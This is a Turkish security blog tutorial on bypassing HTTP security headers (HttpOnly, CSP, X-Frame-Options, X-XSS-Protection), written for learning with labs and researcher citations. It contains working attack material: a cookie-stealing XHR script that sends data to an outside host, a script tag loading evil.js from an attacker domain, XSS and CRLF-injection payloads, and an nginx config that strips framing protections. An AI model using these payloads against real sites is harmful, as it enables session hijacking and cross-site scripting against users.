---
layout: post
title: HTTP Güvenlik Başlıklarını Atlatmak
date: 2022-12-21
tag: http güvenlik başlıkları, bypass, web security, http security headers
categories: web-security
permalink: http-guvenlik-basliklarini-atlatmak
published: true
lang: tr
---

Herkese selamlar. 2022 yılının son blogpost'unu yıl sona ermeden yazmak ve yayınlamak istedim. Blogumda şuana dek AWS güvenliği üzerine odaklı yazılar yayınlamış olsamda aslında ele almak istediğim kapsam daha geniş. Bu noktada bugün daha farklı bir konuya değinmek istedim. Hepimizin aşina olduğu HTTP güvenlik başlıklarının çeşitli senaryolarda nasıl atlatılabildiği (bypass) üzerine bir blogpost olacak. Bu noktada bu güvenlik başlıklarının ne olduklarına ve nasıl çalıştıklarına detaylıca değinmeyeceğim. Eğer bu noktada eksik olduğunuzu düşünüyorsanız bu blogpost'u okumadan önce HTTP güvenlik başlıklarını kısaca araştırmanızı şiddetle tavsiye ediyorum. Son olarak bu blogpost'un amacının HTTP güvenlik başlıklarına Deep Dive bakış yapmak olmadığını ve daha önce yayınlanmamış yöntemleri içermediğini belirtmeliyim. Web güvenliğine meraklı kişilerin elinin altında derli toplu bir kaynak olması amaçlanmaktadır.

## HttpOnly Flag'inin Atlatılması
Öncelikle söylemekte fayda var ki bu blogpost'ta anlatılan yöntemler senaryo bağımlı olabilmektedir. Buda her ortamda her durumda buradaki yöntemlerin çalışmayacağı anlamına gelir. Bilinen birden fazla bypass yöntemi bulunmaktadır. Bunlar:
* Bypass via PHPInfo
* Cross Site Tracing
* Cookie Jar Overflow

### HttpOnly Bypass via PHPInfo File
Bu bypass yöntemindeki mantık özünde oldukça basittir. HttpOnly flag'ı ile işaretlenmiş bir Cookie değeri varsa bu değeri XHR vb. metotlar ile elde etmek mümkün değildir. Fakat zafiyetli sitede PHPInfo dosyası unutulmuş ise ve bu dosyaya erişimimizde herhangi bir kısıtlama yoksa HttpOnly flag'ını bypasslamak mümkün oluyor. Şöyle ki PHPInfo dosyası bilindiği gibi PHP'nin durumu ile ilgili çok geniş bilgileri (konfigürasyon ayarları, sürüm bilgileri, environment bilgileri, ortam değişkenleri vs.) tarafımıza sunan bir fonksiyondur. Burada duruma bağlı olarak Header bilgileri de plaintext bir şekilde ekrana basılmaktadır.

<img src="/assets/blog-photos/http-security-headers-bypasses/phpinfo-file-details.png" class="imgCenter" alt="PHPInfo Details" />

Bu noktadan itibaren XHR kullanarak PHPInfo dosyasını okumanız durumunda HttpOnly işaretlenmiş Cookie'leri de rahatlıkla çalabilmiş olacaksınız. Örnek XHR kodu ise şu şekilde olacaktır;
```js
var req = new XMLHttpRequest();
req.onload = reqListener;
var url = 'https://REDACTED/phpinfo.php';
req.withCredentials = true;
req.open('GET', url, false);
req.send();

function reqListener() {
var req2 = new XMLHttpRequest();
const sess = this.responseText.substring(this.responseText.indexOf('HTTP_COOKIE') + 1 );
req2.open('GET', 'https://REDACTED/?data=' + btoa(sess), false);
req2.send()
};
```

Bu noktada esasında başlıkta "HttpOnly Bypass via PHPInfo File" dedik fakat methoddan anlayabileceğiniz üzere HttpOnly işaretlenen Cookie değerini sayfanın kaynağına plain text yazan herhangi bir sayfada işe yarayacaktır. Elbetten kullanacağımız XHR kodunda ufak değişiklikler olacaktır.

### Cookie Jar Overflow
Cookie Jar Overflow ile HttpOnly flag'ının nasıl bypasslandığını anlamak için öncelikle Cookie Jar Overflow'un ne olduğundan bahsetmek gerekir. "Overflow" kelimesini duyar duymaz kafanızda bazı şeylerin canlandığını biliyorum. Konuya açıklık getirmek gerekirse; kullandığımız her tarayıcının depolayacakları Cookie sayısı konusunda limitasyonları bulunmaktadır. Bu limitasyonlar tarayıcıdan tarayıcıya değişse de bir domain için birkaç yüz Cookie ile sınırlıdır. Eğer daha fazla Cookie yazılırsa eski Cookie'ler silinmeye başlar. 

Buradan yola çıkarak eğer çok sayıda Cookie tanımlayabilirsek eski HttpOnly işaretlenmiş Cookie'ler silinecektir. Böylece aynı isimde HttpOnly olmayan bir Cookie tanımlanabilecektir. Her şey güzel fakat burada web uygulamasını etkileyen durum nedir dediğinizi duyar gibiyim. Web uygulamasının bu zafiyetten etkilenmesi için sessionid değeri değişmesine rağmen hesapta aktif oturumun devam ettiği bir senaryo olmalıdır.  (Bknz: Session Fixation)

Demo ortamı ve detaylı bilgi için zafiyeti bulan araştırmacı olan <a href="https://www.sjoerdlangkemper.nl/2020/05/27/overwriting-httponly-cookies-from-javascript-using-cookie-jar-overflow/" target="_blank">Sjoerd Langkemper'ın blogpost'una</a> göz atabilirsiniz.

### Cross Site Tracing (XST)
Konuya bir girişgah yapmadan şunu belirtmeliyim ki modern tarayıcılar TRACE methodu kullanılarak yapılan JavaScript Request'lerine izin vermemekte. Bu noktada bu zafiyetin güncelliğini bir noktada yitirdiğini söyleyebiliriz. Fakat literatürde var olan bir zafiyete de kısaca değinmeden geçmek istemedim.

<img src="/assets/blog-photos/http-security-headers-bypasses/trace-method-not-allowed-firefox.png" class="imgCenter" alt="Trace Method Not Allowed - Firefox" />

Bu atak vektörü TRACE ve TRACK HTTP metodları kullanılarak yapılmaktadır. Bu noktada TRACE ve TRACK metodlarının ne iş yaptığını bilmemizde fayda olacaktır. TRACE ve TRACK methodları, istemcinin istek zincirinin diğer ucunda nelerin alındığını görmesine ve bu verileri test veya teşhis bilgileri için (diagnostic) kullanmasına olanak tanır. Bir örnek üzerinden XST atağını anlatalım:

<img src="/assets/blog-photos/http-security-headers-bypasses/trace-method-1.png" class="imgCenter" alt="cURL Trace Method Usage" />

Yukarıdaki görselde TRACE methodu kullanıldığında dönen Response'u görmektesiniz. Buradan yola çıkarak Cookie parametresini TRACE methodu ile birlikte kullanırsak olacaklar şöyledir:

<img src="/assets/blog-photos/http-security-headers-bypasses/trace-method-2.png" class="imgCenter" alt="cURL Trace Method Usage" />

Gördüğünüz üzere dönen Response'ta bize Cookie bilgisi de iletilmektedir. Eğer bu noktada Cookie Header'ını da post edecek şekilde bir XHR kodu kullanırsak HttpOnly işaretli Cookie'leri de çalabileceğizdir. Kullanmamız gereken kod aşağıdaki gibi olmalıdır:
```js
<script>
  var xmlhttp = new XMLHttpRequest();
  var url = 'http://REDACTED/';

  xmlhttp.withCredentials = true; // send cookie header
  xmlhttp.open('TRACE', url, false);
  xmlhttp.send();
</script>
```

Konuyla ilgili detaylı bilgiye konunun keşifçisi Jeremiah Grossman'ın yazmış olduğu <a href="https://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf" target="_blank">WhitePaper'dan</a> ulaşabilirsiniz.

## Content-Security-Policy (CSP) Header Bypass
Content-Security-Policy HTTP başlığının yanlış konfigüre edilmesinden kaynaklı atlatma yöntemleri ortaya çıkmaktadır. Burada CSP başlığını konfigüre etmenin belli bir standartı bulunmamaktadır. Bu durum tamamen yazılım geliştiricinin / sistem yöneticisinin elindedir ve çeşitli caselere göre değişiklik gösterecektir. Bu noktada belirtmeliyim ki CSP'yi bypasslamanın oldukça fazla yolu vardır. Bu blogpostta en popüler yöntemlerden bahsedeceğim. Bunlar şu şekildedir:
* Wildcard (*)
* unsafe-inline
* File Upload ve self Direktifinin Kullanılması Durumu
* Whitelisted Scheme
* base-uri Direktifinin Bulunmaması Durumu

### Wildcard
Wildcard yani asterisk sembolü (*) bilgisayar bilimlerinde hemen her alanda aynı anlama gelmektedir sanıyorum. Bu karakter tümü anlamına gelmektedir. Bir öncek ile açıklamamız gerekirse ***.ayberk.ninja** şeklinde bir tanımlama yaparsak bu tüm subdomainleri kapsadığı anlamına gelecektir.

```http
Content-Security-Policy: script-src self https://*.ayberk.ninja; img-src *
```
Bir başka wildcard örneği verecek olursak;

```http
Content-Security-Policy: script-src 'self' https://twitter.com https: data *; 
```

Burada gelen kaynağın adresine bakmaksızın gelen source'ları kabul edecektir. Burada zafiyeti sömürmek için aşağıdaki gibi bir payload kullanılabilir:
```html
"/>'><script src=https://attacker-website.com/evil.js></script>
```

> Burada kaçırılmaması gereken nokta, wildcard direktifinin data: blob: ve filesystem: şemalarına da izin vermesidir.

### unsafe-inline
Burada inline'ın anlamını hepimizin bildiği bir örnek ile açıklayalım.
```js
<script>document.getElementById(errorBox).style.display = "none";</script>
```

Bir HTML belgesinin içerisinde tanımlanmış CSS satırlarına inline CSS, JS satırlarına ise inline JavaScript denmektedir. İsminden de anlaşılabileceği üzere unsafe-inline ise inline JavaScript ve CSS kullanımına izin verildiği anlamına gelmektedir. Örnek tanımlanma şekli şöyledir:
```http
Content-Security-Policy: script-src https://google.com 'unsafe-inline'; 
```

Bu direktifte doğrudan **"/><script>alert(1);</script>** gibi bir payload çalışacaktır. Demo ortamında örneğimizi incelemek için <a href="https://brutelogic.com.br/csp/csp-unsafe-inline.php?p=%3Csvg%20onload=alert(1337)%3E" target="_blank">Brute Logic'in CSP Lab'ını</a> kullandım. Sayfanın kaynak kodunu aşağıdaki görselde görmektesiniz.

<img src="/assets/blog-photos/http-security-headers-bypasses/unsafe-inline-source-code.png" class="imgCenter" alt="unsafe-inline Lab - Source Code" />

En basic payload'umuzu kullanalım ve neler olduğunu görelim.

<img src="/assets/blog-photos/http-security-headers-bypasses/unsafe-inline-exploit.png" class="imgCenter" alt="unsafe-inline Lab - Exploit" />

### File Upload ve self Direktifinin Kullanılması Durumu
Eğer hedef sistemde dosya yükleyebildiğiniz bir alan varsa ve yüklenen dosyanın konumunu tespit edebiliyorsanız CSP'yi atlatabiliyor olabilirsiniz. Fakat bu tek başına yeterli değildir. Bir diğer hususta CSP implementasyonunda self direktifinin kullanılmış olmalıdır. Örnek bir CSP tanımı şu şekilde olmalıdır:
```http
Content-Security-Policy: script-src 'self'; 
``` 

Buradaki self direktifi adı üstünde kendi Origin'inden gelen kaynakları (subdomainler dahil) kabul edeceği anlamına gelmektedir. Bu durumda örnek payload'umuz şu şekilde olacaktır: 
```html
"/>'><script src="/uploads/picture.png.js"></script>
``` 

Yukarıdaki payload'da gördüğünüz üzere zararlı JS dosyasını herhangi bir tag kullanmadan çağırabilmekteyiz.

### Whitelisted Scheme
URL şema kavramı bu blogpostu okuyan herkesin aşina olduğu bir kavramdır sanıyorum. Biliyorsunuz ki modern tarayıcılar farklı dosya tiplerini açabilmektelerdir. Hepimizin tarayıcının URL alanına yazmış olduğu https:// alanı aslında şemayı belirttiğimiz kısımdır. Bu noktada CSP'de data: veya https: şemasına izin verilmesi ve değerinin boş bırakılması gerekmektedir. Örnek bir konfigürsayonun şu şekilde olması gerekir:
```http
Content-Security-Policy: script-src data: ;
``` 

Bu noktada örnek payload şu şekilde olmalıdır: **<script src=data:alert(1)></script>** . Lab olarak yine Brute Logic'in lab'ını kullanıyorum.

<img src="/assets/blog-photos/http-security-headers-bypasses/data-whitelist-exploit.png" class="imgCenter" alt="Data Scheme Whitelist Lab - Exploit" />

### base-uri Direktifinin Bulunmaması Durumu
base-uri direktifini anlamak için öncelikle base HTML elementini bilmemiz gerekmektedir. Bir sayfadaki tüm göreli URL'ler için Base URL tanımlamamıza olanak sağlar. Küçük bir örnek ile açıklamamız gerekirse:
```html
<html>
    <head>
      <base href="https://ayberk.ninja/uploads/2022/12/" target="_blank">
    </head>
    <body>
        <img src="http-security-headers-bypass.png">
        <p><a href="https://ayberk.ninja/about">About Me!</a></p>
    </body>
</html>
```
Yukarıdaki örnekte base URL olarak **target="_blank"** özelliği ile link olarak **ayberk.ninja/uploads/2022/12/** path'ini tanımladık. Body'de tanımlamış olduğumuz img tag'i Relative Path'inin base tag'de belirlediğimiz path olduğunu bilecektir. Ve ayrıca tanımlamış olduğumuz a tag'i ise target="_blank" tanımı bulundurmamasına rağmen bu özelliği taşıyacaktır.

Base Tag'ini açıkladığımıza göre hızlıca base-uri direktifinin ne yaptığına bakalım ve bu direktifi nasıl atlatabileceğimizi inceleyelim. base-uri direktifi, base tag'inde kullanılabilecek değerler ile ilgili kısıtlamalar yapmamıza olanak tanır. Örnek tanım şu şekilde olacaktır:
```http
Content-Security-Policy: script-src 'nonce-ayberk1337';
```

Bu direktifi atlatmak için ise base tag'i kullanılmalıdır. **<base href=//x55.is>** şeklinde bir payload işimize yarayacaktır.

## X-Frame-Options Header Bypass
Tahmin edebileceğiniz üzere her HTTP güvenlik başlığının bilinen atlatma yöntemi bulunmamaktadır. Fakat X-Frame-Options başlığının da atlatılabildiği senaryolar bulunmakta. Bu blogposta şu atlatma yöntemlerinden bahsedeceğim:
* Nested Frame'lerin Atlatılması
* Proxy

### Nested Frame'lerin Atlatılması
Nefted yani iç içe frame kullanımı yanlış konfigüre edildiyse atlatılabilmektedir. Nested frameler SameOrigin direktifi ile birlikte kullanıldığı durumlarda atlatılabiliyor. Eğer frame'leri engellemek için CSP'nin frame-ancestors direktifi yerine X-Frame-Options'ın SAMEORIGIN direktifini kullandıysanız problem burada başlıyor. SAMEORIGIN direktifi, frame-ancestors'un aksine frame'leri yalnızca top-level konuma göre kontrol eder. X-Frame-Options'ın RFC'si olan <a href="https://www.rfc-editor.org/rfc/rfc7034" target="_blank">RFC-7034'e</a> göre:
> In some, it only allows a page to be framed if the origin of the top-level browsing context is identical to the origin of the content using the X-Frame-Options directive; in others, it may consider the origin of the framing page instead.

Chrome Status'ün sayfasına göz gezdirirken arkadaşım <a href="https://twitter.com/hebunilhanli" target="_blank">Hebun İlhanlı'nın</a> gözüne şu tartışma konusu çarptı: <a href="https://chromestatus.com/feature/4678102647046144" target="_blank">Feature: X-Frame-Options: SAMEORIGIN matches all ancestors.</a> Bu noktada şunu söyleyebiliriz ki ilgili bulgu güncelliğini yitirmiş görünüyor.

<img src="/assets/blog-photos/http-security-headers-bypasses/x-frame-options-chromium-update.png" class="imgCenter" alt="X-Frame-Options Chromium Update" />

### Proxy
Hepimiz Reverse Proxy kavramını en azından bir kere duymuşuzdur. En azından CloudFlare ile hayatımızın bir yerlerinde karşılaşmışızdır. İşte buradaki bypass yöntemimiz de tam olarak Proxy'ler ile ilgili. Aşağıdaki görsel üzerinden durumu özetleyelim.

<img src="/assets/blog-photos/http-security-headers-bypasses/proxy-xfo-bypass.jpg" class="imgCenter" alt="Proxy XFO Bypass Scheme" />

Aslında görmüş olduğunuz yapı normal bir Proxy'nin çalışma yapısı. Client isteğini sunucuya iletmek için ve sunucudan dönen cevabı almak için Proxy'yi kullanmakta. Burada Proxy, saldırganımızın kontrolünde. Bu noktada **3** numaralı adımda Proxy tarafından X-Frame-Options başlığı kaldırılır. Örneğin saldırganın nginx kullandığını var sayarsak aşağıdaki konfigürasyon ile bu işlemi gerçekleştirebilecektir:
```nginx
server {
        listen 80;
        listen [::]:80;
        server_name <SERVERNAME>;

        location / {
                proxy_set_header Host <HOST>;
                proxy_set_header X-Real-IP $remote_addr;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
                proxy_pass https://<HOST>/;

                proxy_hide_header Content-Security-Policy;
                proxy_hide_header X-Frame-Options;
                add_header X-Frame-Options "ALLOWALL";
        }
}
```
## X-XSS-Protection Header Bypass
Söz konusu zafiyet eğer XSS ise gün geçmiyor ki yeni bir payload, yeni bir güvenlik çözümleri için bypass yöntemi ortaya çıkmasın. Ben bu noktada hepimizin yakından bildiği X-XSS-Protection HTTP başlığının CRLF Injection ile nasıl atlatılabileceğinden bahsetmek istiyorum.

### X-XSS-Protection Bypass via CRLF Injection
CRLF Injection zafiyetinde HTTP yanıtını bölerek Body ve/veya Header ekleyebildiğimiz biliyoruz. Buradaki zafiyette de tam olarak bu durum söz konusu. Güvenli sayılan bir X-XSS-Protection yapısı normalde şu şekildedir:
```http
X-XSS-Protection: 1; mode=block
```

Eğer CRLF Injection zafiyeti yardımıyla **X-XSS-Protection: 0;** tanımını yapabilirsek ve Body'de XSS Payload'umuzu gönderirsek ne olur? Şanslıysak X-XSS-Protection başlığını bypasslayabiliriz. Aşağıdaki URI'ı inceleyelim.
```http
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

Burada olanlara biraz daha yakından bakacak olursak CR(%0d) ve LF(%0a) karakterleri ile **Content-Length:35** ve **X-XSS-Protection:0** HTTP başlıkları eklenmekt. Ardından XSS payload'umuz yani **<svg onload=alert(document.domain)>** 'i ekliyoruz. Burada dikkat etmemiz gereken nokta ise Content-Length değerinin Payload'umuzun karakter sayısına eşit olarak set edilmesidir. Son durumunda HTTP isteği şu şekilde olacaktır:
```ruby
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2022 01:33:70 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2022 13:37:00 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

Bu noktada X-XSS-Protection HTTP başlığını atlatmış ve Reflected XSS zafiyetini tetiklemiş olacağız. Unutmamalıyız ki aynı yöntem ile CSP gibi farklı güvenlik başlıkları da atlatılabilmekte.

## Geri Bildirim
HTTP güvenlik başlıklarının nasıl atlatılabileceğini anlattığım blog yazısı bu kadardı. Herhangi bir geri bildiriminiz olması durumunda benimle herhangi bir iletişim kanalı (Twitter, Threema vb.) üzerinden iletişime geçebilirsiniz. Geri bildirimleriniz üzerine blog yazılarını ivedi olarak güncellemekteyim. Son olarak güncelliğini yitirmiş atlatma yöntemlerini de ele almamın sebebi işin çıkış noktalarını daha iyi kavramanız ve tarihçesini de bilmenizi istemem idi.